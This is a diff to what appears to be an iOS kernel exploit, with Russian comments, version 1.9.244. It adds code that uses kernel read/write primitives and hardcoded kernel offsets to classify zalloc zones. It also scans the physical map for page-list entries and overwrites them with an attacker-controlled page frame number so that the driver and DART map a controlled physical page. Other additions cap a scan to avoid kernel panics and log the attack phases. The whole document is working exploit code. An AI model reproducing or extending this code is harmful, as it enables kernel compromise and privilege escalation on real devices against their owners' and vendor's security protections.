@@ -72,6 +72,33 @@ static BOOL kpSafeToRead(uint64_t va)
     return pa && !kpFrameDeadly(pa);
 }
 
+// 1.9.244: per-cpu дискриминатор zone_require (р.58/59 — формула подтверждена
+// самой паникой zalloc.c:1308): metaBase=[sym+0x68]; meta=metaBase+(VA>>14)*0x10;
+// zoneIdx=*(u16*)meta & 0x3ff; zone=zoneArr+zoneIdx*0xc0; perCpu=([zone+0x3c]>>6)&1.
+// Рет: 1 = per-cpu зона (запись легальна, но ЛЮБОЙ generic-free по ней паникует),
+// 0 = обычная зона, -1 = не зона / не удалось (VM-map класс — вне guard'а).
+static int kpZoneClass(uint64_t va)
+{
+    static uint64_t metaBase = 0, zoneArr = 0;
+    if (!metaBase) {
+        uint64_t symPtr = kconstant(base) + 0xa9c758ULL;   // unslid 0xfffffff007a9c758
+        uint64_t mb = early_kread64(symPtr + 0x68);
+        if (!kpLooksLikeKernelPointer(mb)) return -1;
+        metaBase = mb;
+        zoneArr  = kconstant(base) + 0x3a5b7c0ULL;          // unslid 0xfffffff00aa5f7c0
+    }
+    uint64_t meta = metaBase + (va >> 14) * 0x10;
+    if (!kpSafeToRead(meta)) return -1;
+    uint8_t zb[2] = {0, 0};
+    kreadbuf(meta, zb, 2);
+    uint32_t zoneIdx = *(uint16_t *)zb & 0x3ff;
+    uint64_t zone = zoneArr + (uint64_t)zoneIdx * 0xc0;
+    if (!kpSafeToRead(zone + 0x3c)) return -1;
+    uint8_t f = 0;
+    kreadbuf(zone + 0x3c, &f, 1);
+    return (f >> 6) & 1;
+}
+
 // The EL2 domain faults in the physical aperture when read via the socket
 // primitive — PANIC. 1.9.6: the old "whole 01..02 band minus kernel image"
 // guard also blocked the libsptm PAPT table, which lives in ordinary EL1
@@ -5814,6 +5841,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     //    create, ДО churn/submit/execute. Сравнение со SCAN B (после execute)
     //    отвечает: create-wired (redirect после create невозможен) или
     //    execute-wired (подмена просто не в то поле).
+    uint64_t saAddr[24] = {0}, saQ[24] = {0};   // 1.9.244: SCAN A хиты — ранний патч до DEP-скана
+    int nSA = 0;
     kpNote(r, @"  SCAN A (после create, до churn/submit):");
     {
         uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
@@ -5839,6 +5868,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 else if ((uint32_t)q == (uint32_t)pfn64m) form = 4;
                 if (!form) continue;
                 nHits++;
+                if (nSA < 24) { saAddr[nSA] = kva + o; saQ[nSA] = q; nSA++; }
                 kpNote(r, [NSString stringWithFormat:@"    [A] hit#%d форма%d @ %#llx: %#018llx", nHits, form,
                           (unsigned long long)(kva + o), (unsigned long long)q]);
             }
@@ -6268,11 +6298,58 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // паника назовёт адрес (x1), остальное не тронуто.
     uint64_t hitAddr[24], hitOld[24]; int hitForm[24];   // DEP-хиты уровня функции — форж перепатчит на ucredPFN (1.9.208)
     int nDep = 0;
+    // 1.9.244: РАННИЙ ПАТЧ — page-0 записи page-list из SCAN A (найдены до любого
+    // submit, до 9+ секунд DEP-скана = вне окна мины). zone-VA по значению хита
+    // (physmap-записей ноль — урок 220/242), классификатор зоны р.59 в лог,
+    // запись с сохранением hi32 (форма5). Retry-цикл ниже подхватывает их как
+    // обычные DEP-хиты; restore — сразу после вердикта, до любого teardown'а.
+    if (pfn32 && ctlPFN && nSA) {
+        for (int i = 0; i < nSA && nDep < 24; i++) {
+            uint64_t q = saQ[i];
+            if (!((uint32_t)q == pfn32 && ((uint32_t)(q >> 32) == 0 || (uint32_t)(q >> 32) == 4))) continue;
+            uint64_t pd244 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+            uint64_t ro244 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
+            uint64_t anch[3] = { surfVA, pd244, ro244 };
+            uint64_t mnZ = ~0ULL, mxZ = 0, zva = 0;
+            for (int a = 0; a < 3; a++) if (kpLooksLikeKernelPointer(anch[a])) { if (anch[a] < mnZ) mnZ = anch[a]; if (anch[a] > mxZ) mxZ = anch[a]; }
+            if (mnZ != ~0ULL) {
+                uint64_t lo = (mnZ & ~0x3fffULL) - 0x2000000ULL, hi = (mxZ & ~0x3fffULL) + 0x2000000ULL;
+                for (uint64_t pg = lo; pg < hi && !zva; pg += 0x4000) {
+                    if (!kpSafeToRead(pg)) continue;
+                    uint64_t ppa = kvtophys(pg);
+                    int pft = ppa ? kpFrameTypeOf(ppa) : -1;
+                    if (!(pft == 0x21 || pft == 0x6 || pft == 0xc)) continue;
+                    uint8_t zbuf[0x4000];
+                    kreadbuf(pg, zbuf, sizeof(zbuf));
+                    for (uint32_t zo = 0; zo + 8 <= sizeof(zbuf) && !zva; zo += 8) {
+                        uint64_t zq = 0; memcpy(&zq, zbuf + zo, 8);
+                        if (zq != q) continue;
+                        if (pg + zo == saAddr[i]) continue;   // physmap-алиас сам себя
+                        zva = pg + zo;
+                    }
+                }
+            }
+            if (!zva) {
+                kpNote(r, [NSString stringWithFormat:@"  [EARLY] page-0 pfn32(hi=%u) @ physmap %#llx — zone-VA НЕ найден, хит пропущен (устройство живо, яд не вписан)", (uint32_t)(q >> 32), (unsigned long long)saAddr[i]]);
+                continue;
+            }
+            int zc = kpZoneClass(zva);
+            kpNote(r, [NSString stringWithFormat:@"  [EARLY] ★ page-0 запись pfn32(hi=%u) zone-VA %#llx → ctlPFN %#x (зона: %@)",
+                      (uint32_t)(q >> 32), (unsigned long long)zva, ctlPFN,
+                      zc == 1 ? @"PER-CPU (free по ней = паника, restore обязателен)" : zc == 0 ? @"обычная" : @"не зона/VM"]);
+            usleep(1500);
+            early_kwrite64(zva, (q & 0xffffffff00000000ULL) | ctlPFN);
+            uint64_t rb = early_kread64(zva);
+            kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
+            hitAddr[nDep] = zva; hitOld[nDep] = q; hitForm[nDep] = 5; nDep++;
+        }
+    }
     if (pfn32 && ctlPFN) {
         uint64_t ftVA2 = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
         uint64_t totalPages2 = kconstant(physSize) >> 14;
         static uint8_t ftCh2[0x10000];
-        for (uint64_t fb = 0; fb < totalPages2 && nDep < 24 && ftVA2; fb += 4096) {
+        uint32_t frBudget = 100;   // 1.9.244: кап DEP-скану — 100 фреймов ≈ 12с; больше = чистое окно мины, хитов всё равно не было
+        for (uint64_t fb = 0; fb < totalPages2 && nDep < 24 && ftVA2 && frBudget; fb += 4096) {
             uint64_t nent = totalPages2 - fb; if (nent > 4096) nent = 4096;
             kreadbuf(ftVA2 + fb * 16, ftCh2, (size_t)(nent * 16));
             for (uint64_t e = 0; e < nent && nDep < 24; e++) {
@@ -6288,6 +6365,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kpNote(r, [NSString stringWithFormat:@"  [DEP] читаю фрейм %#llx t=%#x", (unsigned long long)pa, t2]);
                 uint8_t pbuf2[0x4000];
                 kreadbuf(kva, pbuf2, sizeof(pbuf2));
+                frBudget--;
                 for (uint32_t o = 0; o + 8 <= sizeof(pbuf2) && nDep < 24; o += 8) {
                     uint64_t q = 0; memcpy(&q, pbuf2 + o, 8);
                     // 1.9.242: детектор по СИГНАТУРЕ, без серии — page-list в этом
@@ -6446,6 +6524,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // Оригинал возвращаем после execute (teardown-safety).
     uint64_t vaFldObj = 0, vaFldOld = 0;
     uint32_t vaFldOff = 0;
+    kpNote(r, @"  [PH] VAD (VA-field deputy) — старт");   // 1.9.244 крошка фаз
     if (ctlKVA) {
         uint64_t pd198 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;   // plane(+0x30) — как в pd-дампе
         uint64_t pools198[16] = { pd198, surfVA ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0, surfVA };
@@ -6533,6 +6612,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // backingPA на ctlPA, и драйвер сам построит PTE. Оригинал вернём после execute.
     uint64_t parHitArr = 0, parHitOld = 0;
     uint32_t parHitOff = 0;
+    kpNote(r, @"  [PH] PAR (parent-ranges) — старт");   // 1.9.244 крошка фаз
     {
         uint64_t pd202 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
         uint64_t parentMD = (kpLooksLikeKernelPointer(pd202) && kpSafeToRead(pd202)) ? kp_untag_ptr(early_kread64(pd202 + 0x60)) : 0;
@@ -6665,6 +6745,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // 0x86eb7cc скопирует в desc+0x9c при execute → DART замапит ctlPA.
     uint64_t ownHitArr = 0, ownHitOld = 0;
     uint32_t ownHitOff = 0;
+    kpNote(r, @"  [PH] OWN (owner-MD база) — старт");   // 1.9.244 крошка фаз
     {
         uint64_t pd207 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
         if (kpLooksLikeKernelPointer(pd207) && kpSafeToRead(pd207)) {
@@ -6733,6 +6814,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // лотереи — прямо по цепочке объектов.
     uint64_t rmdHitArr = 0, rmdHitOld = 0;
     uint32_t rmdHitOff = 0;
+    kpNote(r, @"  [PH] RMD (root-MD page-list) — старт");   // 1.9.244 крошка фаз
     {
         uint64_t pd211 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
         uint64_t rootMD = (kpLooksLikeKernelPointer(pd211) && kpSafeToRead(pd211)) ? kp_untag_ptr(early_kread64(pd211 + 0x60)) : 0;
@@ -7456,6 +7538,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (hitForm[i] < 0 || hitForm[i] == 4) continue;
             uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | ctlPA)
                         : (hitForm[i] == 3) ? (((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL))
+                        : (hitForm[i] == 5) ? ((hitOld[i] & 0xffffffff00000000ULL) | ctlPFN)
                         : (uint64_t)ctlPFN;
             early_kwrite64(hitAddr[i], nq);
         }
@@ -7568,6 +7651,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | pagePA)
                                     : (hitForm[i] == 3) ? (((uint64_t)fPFN << 32) | (hitOld[i] & 0xffffffffULL))
                                     : (hitForm[i] == 4) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
+                                    : (hitForm[i] == 5) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
                                     : (uint64_t)fPFN;
                         early_kwrite64(hitAddr[i], nq);
                     }
